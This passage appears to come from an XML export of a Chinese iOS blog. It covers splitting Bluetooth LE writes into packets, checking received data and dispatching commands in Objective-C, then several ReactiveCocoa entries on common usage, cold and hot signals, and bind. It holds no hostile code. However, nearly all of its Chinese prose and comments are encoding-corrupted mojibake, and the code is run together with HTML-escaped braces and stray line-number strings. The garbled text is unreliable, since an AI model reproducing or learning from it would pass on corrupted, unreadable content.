1ã€å†™å…¥æ•°æ®ï¼šå¦‚æžœæƒ³æœ€å¤§ç¨‹åº¦çš„çš„å‘æŒ¥è“ç‰™çš„æ•ˆçŽ‡ï¼Œå°±éœ€è¦å¯¹å‘é€çš„æ•°æ®è¿›è¡Œåˆ†åŒ…å¤„ç†å¹¶ä¸”å°½å¯èƒ½ä¿è¯é™¤åŽ»åè®®æ‰€å çš„å­—èŠ‚åŽæ¯åŒ…æºå¸¦çš„æœ‰æ•ˆæ•°æ®é•¿åº¦æ¯”è¾ƒå¤§ å‡è®¾æˆ‘ä»¬å‘é€çš„æ¯ä¸€åŒ…æ•°æ®åè®®æ ¼å¼ä¸ºï¼šheader(1Byte) + Length(1Byte) + cmd(1Byte) + paramDataï¼ˆ&lt;= 16Byteï¼‰ + check(1Byte) å¦‚æžœéœ€è¦å‘é€çš„æ•°æ®å°äºŽ16ä¸ªå­—èŠ‚ï¼Œç›´æŽ¥æŒ‰åè®®ç»„è£…æ•°æ®å‘é€ å¦‚æžœéœ€è¦å‘é€çš„æ•°æ®å¤§äºŽ16ä¸ªå­—èŠ‚ï¼Œéœ€è¦æŒ‰16ä¸ªå­—èŠ‚åˆ†åŒ…åŽæŒ‰åè®®ç»„è£…æ•°æ®å‘é€ 1234567891011121314151617181920212223242526272829303132333435363738394041/** å†™å…¥ä¸åˆ†åŒ…æ•°æ® @param data æ•°æ® @param toCharacteristic è¦å†™å…¥çš„ç‰¹å¾å€¼ */- (void)writeSinglePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = NO; // æ˜¯å¦éœ€è¦ç»§ç»­å†™å…¥æ•°æ® [_bleClient.connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse];&#125;/** å†™å…¥éœ€è¦åˆ†åŒ…æ•°æ® @param data éœ€è¦åˆ†åŒ…å‘é€æ•°æ® @param toCharacteristic è¦å†™å…¥çš„ç‰¹å¾å€¼ */- (void)writeMultiplePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = YES; // æ˜¯å¦éœ€è¦ç»§ç»­å†™å…¥æ•°æ® self.subdataOffset = 0; // å·²ç»æˆªå–çš„æ•°æ®é•¿åº¦ self.needSubData = data; // éœ€è¦åˆ†åŒ…çš„æ•°æ® [self writeSubDataToCharacteristic:toCharacteristic];&#125;/** å°†æˆªå–çš„æ•°æ®å‘é€å‡ºåŽ» */- (void)writeSubDataToCharacteristic:(CBCharacteristic *)characteristic &#123; NSInteger totalLength = self.needSubData.length; NSInteger remainLength = totalLength - self.subdataOffset; NSInteger rangLength = remainLength &gt; XSCentralmanagerOTADataSubLength ? XSCentralmanagerOTADataSubLength:remainLength; NSData *data = [self.needSubData subdataWithRange:NSMakeRange(self.subdataOffset, rangLength)]; self.subdataOffset += data.length; if (kObjectIsEmpty(data)) &#123; // é€šçŸ¥ä»£ç†å†™å…¥é”™è¯¯ XSLog(@"æ²¡æœ‰æ•°æ®å¯ä»¥å†™å…¥äº†ã€‚ã€‚ã€‚âœï¸âœï¸âœï¸"); return; &#125; // ç»§ç»­å†™å…¥æ•°æ® [_bleClient.connectedPeripheral writeValue:data forCharacteristic:characteristic type:CBCharacteristicWriteWithResponse];&#125; self.isContinueWritingæ ‡è®°åœ¨æ¯åŒ…æ•°æ®å†™å…¥æˆåŠŸçš„å›žè°ƒ- (void)blePeripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)erroré‡Œé¢æ˜¯å¦ç»§ç»­å†™å…¥ä¸‹ä¸€åŒ…æ•°æ® 2ã€æŽ¥æ”¶æ•°æ®ï¼šå¦‚æžœæŽ¥å—çš„æ•°æ®è¿‡å¤§ï¼Œä¹Ÿä¼šæ˜¯åˆ†åŒ…æŽ¥æ”¶åˆ°ã€‚ æ‰€ä»¥å°±éœ€è¦åœ¨æŽ¥æ”¶è“ç‰™æ•°æ®çš„åœ°æ–¹ï¼Œæ ¡éªŒæŽ¥æ”¶åˆ°çš„æ¯ä¸€åŒ…æ•°æ®é•¿åº¦ä»¥ç¡®ä¿æ•°æ®æŽ¥æ”¶å®Œæ•´ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ•°æ®æŽ¥æ”¶è“ç‰™æ•°æ®æ ¡éªŒçš„å·¥å…·å•ä¾‹ å°†æ•°æ®åè®®å®šä¹‰ä¸ºä¸€ä¸ªæžšä¸¾ æä¾›ä¸€ä¸ªæ–¹æ³•ä¼ å…¥è“ç‰™æŽ¥æ”¶åˆ°çš„æ•°æ®ä»¥åŠä¸€ä¸ªæ•°æ®æŽ¥æ”¶å®Œæ•´çš„å›žè°ƒç»“æžœblock æ¯æ¬¡çš„æ•°æ®éƒ½æŒ‰åè®®è¿›è¡Œæ ¡éªŒå¹¶ç¼“å­˜ä¸­é—´çš„æœ‰æ•ˆæ•°æ® å¦‚æžœå·²ç»æŽ¥æ”¶åˆ°çš„æœ‰æ•ˆæ•°æ®å’Œæ•°æ®æ€»é•¿åº¦ï¼ˆåè®®ä¸­çš„å‘é€é•¿åº¦å­—èŠ‚ï¼‰ä¸ç›¸åŒå°±ç»§ç»­ç­‰å¾…æŽ¥æ”¶ å¦‚æžœå·²ç»æŽ¥æ”¶åˆ°çš„æœ‰æ•ˆæ•°æ®å’Œæ•°æ®æ€»é•¿åº¦ï¼ˆåè®®ä¸­çš„å‘é€é•¿åº¦å­—èŠ‚ï¼‰ç›¸åŒå°±ä»£è¡¨æ•°æ®æŽ¥æ”¶å®Œæ•´ã€å›žè°ƒblock 1234567891011121314151617181920212223242526272829303132333435// åœ¨æŽ¥æ”¶åˆ°è“ç‰™æ•°æ®çš„æ–¹æ³•æ ¡éªŒæ•°æ®- (void)blePeripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; XSLogFunc if (error) &#123; XSLog(@"è¯»å–Characteristicæ•°æ®å¤±è´¥:%@", error); return; &#125; NSData *value = characteristic.value; XSLog(@"è¯»å–åˆ°ç‰¹å¾çš„æ•°æ®:%@", value); // æŽ¥æ”¶åˆ°çš„æ•°æ®å®Œæ•´æ€§æ ¡éªŒ [[XSVerifyBleDataTool shareInstance] handleReceivedDataWithData:value complete:^&#123; NSInteger responseType = XSBleVerifyUtility.responseCmd; if (_dispatchCmdComplete) &#123; _dispatchCmdComplete(responseType); &#125; &#125;];&#125;// æ•°æ®æ ¡éªŒå·¥å…·å•ä¾‹XSVerifyBleDataToolæä¾›ç»™å¤–ç•Œæ ¡éªŒæ–¹æ³•typedef NS_ENUM(NSUInteger, XSReceivedDataState) &#123; XSReceivedDataStateHeader, /**&lt; header */ XSReceivedDataStateLength,/**&lt; æ•°æ®æ€»é•¿åº¦ */ XSReceivedDataStateData,/**&lt; æ•°æ® */ XSReceivedDataStateCheckSum,/**&lt; æ ¡éªŒå’Œ */&#125;;/** å¤„ç†è“ç‰™æŽ¥æ”¶åˆ°çš„æ•°æ® @param receivedData æŽ¥æ”¶åˆ°çš„æ•°æ® @param complete å¤„ç†å›žè°ƒ */- (void)handleReceivedDataWithData:(NSData *)receivedData complete:(void (^)(void))complete; 3ã€å…³äºŽæŒ‡ä»¤è°ƒç”¨ ä»¥ä¸ºå¯èƒ½å…¶ä»–åœ°æ–¹ä¹Ÿä¼šç”¨åˆ°è“ç‰™ï¼Œæ‰€ä»¥æŽ¨èæŠŠæ•´ä¸ªè“ç‰™è¿žæŽ¥åŠéªŒè¯å°è£…æˆä¸€ä¸ªè“ç‰™å·¥å…·ç±» å› ä¸ºAppå’Œå¤–è®¾äº¤äº’çš„æŒ‡ä»¤ä¹Ÿä¼šæ¯”è¾ƒå¤šï¼Œå¯èƒ½ä¼šåˆ†æ•£åœ¨é¡¹ç›®çš„ä¸åŒåœ°æ–¹ï¼Œè€Œè“ç‰™æ•°æ®çš„å†™å…¥å’ŒæŽ¥æ”¶éƒ½æ˜¯åœ¨ä»£ç†æ–¹æ³•ä¸­å›žè°ƒï¼Œæˆ‘çš„åšæ³•æ˜¯æŠŠè°ƒç”¨è“ç‰™æŒ‡ä»¤å†™å…¥æ•°æ®çš„é€»è¾‘æŠ½æˆå…¬å…±çš„æ–¹æ³•ï¼šä¼ éœ€è¦å†™å…¥çš„æ•°æ®ï¼Œå†™å…¥æˆåŠŸçš„å›žè°ƒBlock(å¯ä»¥è°ƒç”¨çš„æŒ‡ä»¤ï¼ŒçŠ¶æ€å›žè°ƒå›žåŽ») 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** æ´¾å‘è“ç‰™æŒ‡ä»¤ @param command è“ç‰™æŒ‡ä»¤ @param paramData æ˜¯å¦éœ€è¦å‘é€å‚æ•° @param complete æŒ‡ä»¤å“åº”åŽå›žè°ƒçš„block */- (void)dispatchCommand:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:XSProtocolHeaderBle bleCmd:command paramData:paramData];&#125;/** æ´¾å‘è“ç‰™æŒ‡ä»¤ @param protocolHeader æŒ‡ä»¤å¤´ ï¼ˆåŒºåˆ†ä¸åŒçš„è“ç‰™åè®®ï¼‰ @param command è“ç‰™æŒ‡ä»¤ @param paramData æ˜¯å¦éœ€è¦å‘é€å‚æ•° @param complete æŒ‡ä»¤å“åº”åŽå›žè°ƒçš„block */- (void)dispatchWithProtocolHeader:(XSProtocolHeader)protocolHeader command:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:protocolHeader bleCmd:command paramData:paramData];&#125;/** å‘é€è“ç‰™æŒ‡ä»¤çš„é€šç”¨å¤„ç†æ–¹æ³•(å¤„ç†å®Œæ•°æ®åŽç›´æŽ¥å†™å…¥è“ç‰™) @param bleCmd å‘é€çš„è“ç‰™æŒ‡ä»¤ @param paramData å‘é€çš„æ•°æ® */- (void)handleUniversalBleRequestWithProtocolHeader:(XSProtocolHeader)protocolHeader bleCmd:(XSBleRequestState)bleCmd paramData:(NSData *)paramData &#123; NSData *resultData = [NSData data]; if (kObjectIsEmpty(paramData)) &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd]; &#125; else &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd paramData:paramData]; // æŒ‰ç…§çº¦å®šçš„åè®®ç»„è£…æ•°æ® &#125; if (resultData.length) &#123; XSLog(@"æœ€ç»ˆå‘é€çš„æŒ‡ä»¤æ•°æ®ï¼š%@", resultData); if (resultData.length &gt; 20) &#123; [self writeMultiplePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; else &#123; [self writeSinglePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; &#125;&#125; æ‰€ä»¥å¤§æ¦‚çš„å†™å…¥é€»è¾‘å°±å¯ä»¥ç®€åŒ–ä¸º 1234[_bleMgr dispatchCommand:XSBleRequestStatusBattery_Level paramData:nil completion:^(NSInteger resultCommand) &#123; // èŽ·å–ç”µæ± ç”µé‡ // ...... &#125; &#125;]; å…³äºŽåŽå°æ¨¡å¼ æŒ‰ç…§Appleçš„ä¸€è´¯å°¿æ€§ï¼Œæ‰“ç€ä¿æŠ¤éšç§çš„åä¹‰é™åˆ¶å„ç§Apiå’Œæƒé™ï¼Œå¦‚æžœæƒ³è“ç‰™åœ¨åŽå°è¿è¡Œä¹Ÿæ˜¯éœ€è¦ç”³è¯·æƒé™å¹¶é…ç½®çš„ Appæ²¡æœ‰ç”³è¯·åŽå°æƒé™åˆ™åœ¨è¿›å…¥åŽå°æ¨¡å¼ä¹‹åŽå¾ˆå¿«å°±ä¼šè¢«æŒ‚èµ·ï¼ˆæŒ‰ä¸‹homeé”®ï¼Œå¤§çº¦5ç§’ï¼Œappè¿›å…¥suspendedçŠ¶æ€ï¼‰ã€‚ å½“appå¤„äºŽæŒ‚èµ·çŠ¶æ€æ—¶ï¼Œæ— æ³•å¤„ç†ä»»ä½•è“ç‰™ç›¸å…³çš„ä»»åŠ¡ç›´åˆ°appè¿›å…¥å‰å°ï¼ˆè¢«ç”¨æˆ·å”¤é†’ï¼‰ã€‚ å¤„äºŽåŽå°æ¨¡å¼ï¼ˆbackgroud stateï¼‰æˆ–è€…æ‚¬æŒ‚æ¨¡å¼ï¼ˆsuspended stateï¼‰æ—¶ï¼Œä½œä¸ºä¸­å¿ƒè®¾å¤‡ï¼Œæ— æ³•æœç´¢å’Œå‘çŽ°å‘¨è¾¹åœ¨å¹¿å‘Šçš„è®¾å¤‡ã€‚ä½œä¸ºå¤–è®¾æ—¶ï¼Œæ— æ³•å¹¿å‘Šï¼Œæ­¤æ—¶ä¸­å¿ƒæƒ³è¦é€šè¿‡å…¬å¼€æœåŠ¡çš„ç‰¹å¾åŽ»è®¿é—®å®ƒçš„è¯éƒ½ä¼šæŠ¥é”™ã€‚ å…·ä½“çš„åŽå°æ¨¡å¼è®¾ç½®åŠæ¢å¤è¯·å‚è€ƒ iOS BLE å¼€å‘å°è®° - å¦‚ä½•å®žçŽ° CoreBluetooth åŽå°è¿è¡Œæ¨¡å¼ å…³äºŽDemo éœ€è¦Demoè¯·ç‚¹å‡»è¿™é‡Œä¸‹è½½ å‚è€ƒAppleå®˜æ–¹æ–‡æ¡£iOS BLE å¼€å‘å°è®° - å¦‚ä½•å®žçŽ° CoreBluetooth åŽå°è¿è¡Œæ¨¡å¼]]></content>
      <categories>
        <category>iOS</category>
        <category>è“ç‰™</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>è“ç‰™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSè“ç‰™å¼€å‘ä¹‹å¤–è®¾ç¯‡]]></title>
    <url>%2Farchives%2Fbd3ad682.html</url>
    <content type="text"><![CDATA[æˆ‘æ—¶å¸¸å›žåˆ°ç«¥å¹´ï¼Œç”¨ä¸€ç‰‡ç«¥å¿ƒæ¥æ€è€ƒé—®é¢˜ï¼Œå¾ˆå¤šçƒ¦æ¼çš„é—®é¢˜å°±å˜å¾—æ˜“è§£ã€‚â€”â€”çŽ‹å°æ³¢ ã€Šä¸€åªç‰¹ç«‹ç‹¬è¡Œçš„çŒªã€‹ å å‘]]></content>
      <categories>
        <category>iOS</category>
        <category>è“ç‰™</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>è“ç‰™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆä¸ƒï¼‰ï¼šå¼€å‘ä¸­å¸¸è§ç”¨æ³•]]></title>
    <url>%2Farchives%2F2a9c0fa5.html</url>
    <content type="text"><![CDATA[å±æ¥¼é«˜ç™¾å°ºï¼Œæ‰‹å¯æ‘˜æ˜Ÿè¾°ã€‚ä¸æ•¢é«˜å£°è¯­ï¼ŒææƒŠå¤©ä¸Šäººã€‚ â€”â€”æŽç™½ã€Šå¤œå®¿å±±å¯ºã€‹ å®žé™…é¡¹ç›®ä¸­çš„ä¸åŒé£Žæ ¼ç”¨æ³•å‚è€ƒå¸¸ç”¨çš„å†™æ³•ç”¨RACæ›¿ä»£ æŽ§ä»¶èµ‹å€¼ä¹Ÿå¯ä»¥è¿™ä¹ˆæ ·ç”¨ï¼ˆç±»ä¼¼äºŽcellä¸­è®¾ç½®ï¼‰12345678910111213141516RAC(self.textLabel, text) = RACObserve(self, city.cityName); // ç›´æŽ¥ç»™labelæ–‡å­—èµ‹å€¼RAC(self.imgView, image) = [[[RACObserve(self, city.thumbnailData) // ç›´æŽ¥ç»™imageView èµ‹å€¼ ignore:nil] map:^id(id value) &#123; // è½¬æ¢å›¾ç‰‡ return [[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; UIImage *image = [UIImage imageWithData:value]; [subscriber sendNext:image]; [subscriber sendCompleted]; return nil; &#125;] subscribeOn:[RACScheduler scheduler]] deliverOn:[RACScheduler mainThreadScheduler]]; // ä¸»çº¿ç¨‹æ›´æ–°&#125;]switchToLatest]; è½¬æ¨¡åž‹ä¹Ÿå¯ä»¥è¿™ä¹ˆç”¨12345678910111213141516171819- (void)initSearchSubscrition &#123;[[self.searchSignal deliverOn:[RACScheduler mainThreadScheduler]] subscribeNext:^(RACTuple *jsonSearchResult) &#123; NSDictionary *response; if (jsonSearchResult.count) &#123; response = jsonSearchResult.first; &#125; NSArray *rawArray = response[@"geoNames"]; self.cities = [[[rawArray.rac_sequence // èŽ·å–çš„æ•°æ®è½¬rac_sequence (é‡Œé¢éƒ½æ˜¯ä¿¡å·) map:^id(NSDictionary *rawDic) &#123; // è½¬æ¨¡åž‹ NSMutableDictionary *dic = [(NSDictionary *)rawDic mutableCopy]; City *city = [MTLJSONAdapter modelOfClass:City.class fromJSONDictionary:dic error:nil]; [self downloadImageForCity:city]; return city; &#125;] array] mutableCopy]; // æ”¾è¿›æ•°ç»„ä¸­ å¹¶æ‹·è´æ–°ç”Ÿæˆä¸€ä»½ &#125;]; [self.searchSignal subscribeError:^(NSError *error) &#123; self.statusMessage = @"offLine"; &#125;];&#125; ä»£ç†æ–¹æ³•ä¹Ÿå¯ä»¥è¿™ä¹ˆè°ƒ12345[[self rac_signalForSelector:@selector(didSaveDataCallback:) fromProtocol:@protocol(SaveDataCallBack)] subscribeNext:^(RACTuple *tuple) &#123; City *newCity = tuple.first; [self.viewModel.cities insertObject:newCity atIndex:0]; [self.geoTbl reloadData]; &#125;]; å¤šä¸ªæ¸ é“è¯·æ±‚æ•°æ®éƒ½è¿”å›žæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ å¯ä»¥è¿™ä¹ˆç»„è£…1234567891011121314151617181920212223RACSignal *requestHot = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"è¯·æ±‚æœ€çƒ­å•†å“"); [subscriber sendNext:@"èŽ·å–æœ€çƒ­å•†å“"]; return nil; &#125;];RACSignal *requestNew = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"è¯·æ±‚æœ€æ–°å•†å“"); // [subscriber sendNext:@"èŽ·å–æœ€æ–°å•†å“"]; return nil; &#125;]; // Selectorè°ƒç”¨:å½“æ‰€æœ‰ä¿¡å·éƒ½å‘é€æ•°æ®çš„æ—¶å€™è°ƒç”¨ // æ•°ç»„å­˜æ”¾ä¿¡å· // Selectoræ³¨æ„ç‚¹:å‚æ•°æ ¹æ®æ•°ç»„å…ƒç´ å†³å®š // Selectoræ–¹æ³•å‚æ•°ç±»åž‹,å°±æ˜¯ä¿¡å·ä¼ é€’å‡ºæ¥æ•°æ® [self rac_liftSelector:@selector(updateUI:data2:) withSignalsFromArray:@[requestHot,requestNew]]; &#125; // åªè¦ä¸¤ä¸ªè¯·æ±‚éƒ½è¯·æ±‚å®Œæˆçš„æ—¶å€™æ‰ä¼šè°ƒç”¨ - (void)updateUI:(NSString *)data1 data2:(NSString *)data2 &#123; NSLog(@"%@ %@",data1,data2); &#125; ç›‘å¬å±žæ€§æ”¹å˜12// è®¾ç½®Label æ–‡å­—è·Ÿç€ TextFieldçš„æ”¹å˜è€Œæ”¹å˜RAC(self.myLab, text) = self.myTF.rac_textSignal; 1234// ç›‘å¬æŸä¸€ä¸ªå±žæ€§çš„æ”¹å˜[RACObserve(self.per, name) subscribeNext:^(NSString *name) &#123; // name å³ self.per.name&#125;]; æ•°ç»„1234NSArray *array = @[@1, @2, @3, @4, @5];[array.rac_sequence.signal subscribeNext:^(id x) &#123; // x å³ æ•°ç»„ array çš„å…ƒç´  &#125;]; 1234// è¿‡æ»¤ filterï¼Œå¹¶èŽ·å–è¿‡æ»¤åŽçš„æ•°ç»„NSArray *filter = [[array.rac_sequence filter:^BOOL(id value) &#123; return [value integerValue] &gt; 2;&#125;] array]; 123456// åŒ¹é…ã€æ˜ å°„ mapï¼Œå˜æ¢å…ƒç´ å¹¶èŽ·å–æ–°æ•°ç»„NSArray *map = [[array.rac_sequence map:^id(id value) &#123; NSInteger a = [value integerValue] * [value integerValue]; return [NSString stringWithFormat:@"%ld", a];&#125;] array]; å­—å…¸1234567// rac_keySequence å’Œ rac_valueSequence è·Ÿæ•°ç»„ä¸€æ ·// rac_sequence éœ€è¦ RACTupleUnpack è§£åŒ…NSDictionary *dic = @&#123;@"name": @"lion", @"age": @18&#125;;[dic.rac_sequence.signal subscribeNext:^(id x) &#123; RACTupleUnpack(NSString *key, NSString *value) = x; NSLog(@"\r\nkey: %@\r\nvalue: %@", key, value);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆå…­ï¼‰ï¼šå†·ä¿¡å·ä¸Žçƒ­ä¿¡å·]]></title>
    <url>%2Farchives%2F53929de4.html</url>
    <content type="text"><![CDATA[è°å®¶çŽ‰ç¬›æš—é£žå£°ï¼Œæ•£å…¥æ˜¥é£Žæ»¡æ´›åŸŽã€‚æ­¤å¤œæ›²ä¸­é—»æŠ˜æŸ³ï¼Œä½•äººä¸èµ·æ•…å›­æƒ…ã€‚ â€”â€”æŽç™½ã€Šæ˜¥å¤œæ´›åŸŽé—»ç¬›ã€‹ å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·ç‰¹ç‚¹ çƒ­ä¿¡å·æ˜¯ä¸»åŠ¨çš„ï¼Œå³ä½¿ä½ æ²¡æœ‰è®¢é˜…äº‹ä»¶ï¼Œå®ƒä»ç„¶ä¼šæ—¶åˆ»æŽ¨é€ã€‚ï¼ˆä¾‹å¦‚å®ƒä¼šæŽ¨é€å€¼å³ä½¿è¿˜æ²¡æœ‰è®¢é˜…è€…ï¼‰è€Œå†·ä¿¡å·æ˜¯è¢«åŠ¨çš„ï¼Œåªæœ‰å½“ä½ è®¢é˜…çš„æ—¶å€™ï¼Œå®ƒæ‰ä¼šå‘é€æ¶ˆæ¯ã€‚ çƒ­ä¿¡å·å¯ä»¥æœ‰å¤šä¸ªè®¢é˜…è€…ï¼Œæ˜¯ä¸€å¯¹å¤šï¼Œä¿¡å·å¯ä»¥ä¸Žè®¢é˜…è€…å…±äº«ä¿¡æ¯ã€‚ï¼ˆè®¢é˜…è€…1å’Œè®¢é˜…è€…2æ˜¯å…±äº«çš„ï¼Œä»–ä»¬éƒ½èƒ½åœ¨åŒä¸€æ—¶é—´æŽ¥æ”¶åˆ°æŸä¸ªå€¼ï¼‰ï¼Œè€Œå†·ä¿¡å·åªèƒ½ä¸€å¯¹ä¸€ï¼Œå½“æœ‰ä¸åŒçš„è®¢é˜…è€…ï¼Œæ¶ˆæ¯ä¼šä»Žæ–°å®Œæ•´å‘é€ã€‚ï¼ˆä¸¤ä¸ªè®¢é˜…è€…æ²¡æœ‰è”ç³»ï¼Œéƒ½æ˜¯åŸºäºŽå„è‡ªçš„è®¢é˜…æ—¶é—´å¼€å§‹æŽ¥æ”¶æ¶ˆæ¯çš„ï¼‰ã€‚ ç¾Žå›¢çš„å‡ ç¯‡èµ„æ–™ ï¼ˆå¼€å‘ä¸­å¯èƒ½é‡åˆ°çš„å‘ï¼‰ ç»†è¯´ReactiveCocoaçš„å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·1 ç»†è¯´ReactiveCocoaçš„å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·2 ç»†è¯´ReactiveCocoaçš„å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·3 RACSignalçš„Subscriptionæ·±å…¥åˆ†æž]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆäº”ï¼‰ï¼šRACåº•å±‚bind]]></title>
    <url>%2Farchives%2Fa972913f.html</url>
    <content type="text"><![CDATA[æ•…äººè¥¿è¾žé»„é¹¤æ¥¼ï¼ŒçƒŸèŠ±ä¸‰æœˆä¸‹æ‰¬å·žã€‚å­¤å¸†è¿œå½±ç¢§ç©ºå°½ï¼Œå”¯è§é•¿æ±Ÿå¤©é™…æµã€‚ â€”â€”æŽç™½ã€Šé€å­Ÿæµ©ç„¶ä¹‹å¹¿é™µã€‹ bindæ–¹æ³•ç®€å•ä»‹ç»å’Œä½¿ç”¨123456789101112131415161718192021222324252627282930313233343536373839404142434445// å‡è®¾æƒ³ç›‘å¬æ–‡æœ¬æ¡†çš„å†…å®¹ï¼Œå¹¶ä¸”åœ¨æ¯æ¬¡è¾“å‡ºç»“æžœçš„æ—¶å€™ï¼Œéƒ½åœ¨æ–‡æœ¬æ¡†çš„å†…å®¹æ‹¼æŽ¥ä¸€æ®µæ–‡å­—â€œè¾“å‡ºï¼šâ€// æ–¹å¼ä¸€:åœ¨è¿”å›žç»“æžœåŽï¼Œæ‹¼æŽ¥ã€‚ [_textField.rac_textSignal subscribeNext:^(id x) &#123; NSLog(@"è¾“å‡º:%@",x); &#125;];// æ–¹å¼äºŒ:åœ¨è¿”å›žç»“æžœå‰ï¼Œæ‹¼æŽ¥ï¼Œä½¿ç”¨RACä¸­bindæ–¹æ³•åšå¤„ç†ã€‚// bindæ–¹æ³•å‚æ•°:éœ€è¦ä¼ å…¥ä¸€ä¸ªè¿”å›žå€¼æ˜¯RACStreamBindBlockçš„blockå‚æ•°// RACStreamBindBlockæ˜¯ä¸€ä¸ªblockçš„ç±»åž‹ï¼Œè¿”å›žå€¼æ˜¯ä¿¡å·ï¼Œå‚æ•°ï¼ˆvalue,stopï¼‰ï¼Œå› æ­¤å‚æ•°çš„blockè¿”å›žå€¼ä¹Ÿæ˜¯ä¸€ä¸ªblockã€‚// RACStreamBindBlock:// å‚æ•°ä¸€(value):è¡¨ç¤ºæŽ¥æ”¶åˆ°ä¿¡å·çš„åŽŸå§‹å€¼ï¼Œè¿˜æ²¡åšå¤„ç†// å‚æ•°äºŒ(*stop):ç”¨æ¥æŽ§åˆ¶ç»‘å®šBlockï¼Œå¦‚æžœ*stop = yes,é‚£ä¹ˆå°±ä¼šç»“æŸç»‘å®šã€‚// è¿”å›žå€¼ï¼šä¿¡å·ï¼Œåšå¥½å¤„ç†ï¼Œåœ¨é€šè¿‡è¿™ä¸ªä¿¡å·è¿”å›žå‡ºåŽ»ï¼Œä¸€èˆ¬ä½¿ç”¨RACReturnSignal,éœ€è¦æ‰‹åŠ¨å¯¼å…¥å¤´æ–‡ä»¶RACReturnSignal.hã€‚// bindæ–¹æ³•ä½¿ç”¨æ­¥éª¤:// 1.ä¼ å…¥ä¸€ä¸ªè¿”å›žå€¼RACStreamBindBlockçš„blockã€‚// 2.æè¿°ä¸€ä¸ªRACStreamBindBlockç±»åž‹çš„bindBlockä½œä¸ºblockçš„è¿”å›žå€¼ã€‚// 3.æè¿°ä¸€ä¸ªè¿”å›žç»“æžœçš„ä¿¡å·ï¼Œä½œä¸ºbindBlockçš„è¿”å›žå€¼ã€‚// æ³¨æ„ï¼šåœ¨bindBlockä¸­åšä¿¡å·ç»“æžœçš„å¤„ç†ã€‚// åº•å±‚å®žçŽ°:// 1.æºä¿¡å·è°ƒç”¨bind,ä¼šé‡æ–°åˆ›å»ºä¸€ä¸ªç»‘å®šä¿¡å·ã€‚// 2.å½“ç»‘å®šä¿¡å·è¢«è®¢é˜…ï¼Œå°±ä¼šè°ƒç”¨ç»‘å®šä¿¡å·ä¸­çš„didSubscribeï¼Œç”Ÿæˆä¸€ä¸ªbindingBlockã€‚// 3.å½“æºä¿¡å·æœ‰å†…å®¹å‘å‡ºï¼Œå°±ä¼šæŠŠå†…å®¹ä¼ é€’åˆ°bindingBlockå¤„ç†ï¼Œè°ƒç”¨bindingBlock(value,stop)// 4.è°ƒç”¨bindingBlock(value,stop)ï¼Œä¼šè¿”å›žä¸€ä¸ªå†…å®¹å¤„ç†å®Œæˆçš„ä¿¡å·ï¼ˆRACReturnSignalï¼‰ã€‚// 5.è®¢é˜…RACReturnSignalï¼Œå°±ä¼šæ‹¿åˆ°ç»‘å®šä¿¡å·çš„è®¢é˜…è€…ï¼ŒæŠŠå¤„ç†å®Œæˆçš„ä¿¡å·å†…å®¹å‘é€å‡ºæ¥ã€‚// æ³¨æ„:ä¸åŒè®¢é˜…è€…ï¼Œä¿å­˜ä¸åŒçš„nextBlockï¼Œçœ‹æºç çš„æ—¶å€™ï¼Œä¸€å®šè¦çœ‹æ¸…æ¥šè®¢é˜…è€…æ˜¯å“ªä¸ªã€‚// è¿™é‡Œéœ€è¦æ‰‹åŠ¨å¯¼å…¥#import &lt;ReactiveCocoa/RACReturnSignal.h&gt;ï¼Œæ‰èƒ½ä½¿ç”¨RACReturnSignalã€‚[[_textField.rac_textSignal bind:^RACStreamBindBlock&#123; // ä»€ä¹ˆæ—¶å€™è°ƒç”¨: // blockä½œç”¨:è¡¨ç¤ºç»‘å®šäº†ä¸€ä¸ªä¿¡å·. return ^RACStream *(id value, BOOL *stop)&#123; // ä»€ä¹ˆæ—¶å€™è°ƒç”¨block:å½“ä¿¡å·æœ‰æ–°çš„å€¼å‘å‡ºï¼Œå°±ä¼šæ¥åˆ°è¿™ä¸ªblockã€‚ // 